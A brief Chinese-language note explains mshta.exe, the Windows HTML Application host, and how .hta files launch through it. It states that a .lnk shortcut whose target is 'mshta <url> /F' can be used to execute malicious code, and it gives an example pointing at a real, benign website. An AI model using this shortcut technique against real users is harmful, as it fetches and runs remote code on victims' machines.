# mshta

mshta, Microsoft HTML Application, 微软的把网页以应用显示的程序。  

最简单的命令示例: `mshta https://www.baidu.com`  

把html文件改为hta后缀，双击就会调用mshta.exe打开  

和lnk文件(快捷方式)配合，可被用作恶意代码执行。  
也就是将lnk文件的目标设为类似这样的形式: `mshta https://www.baidu.com /F`
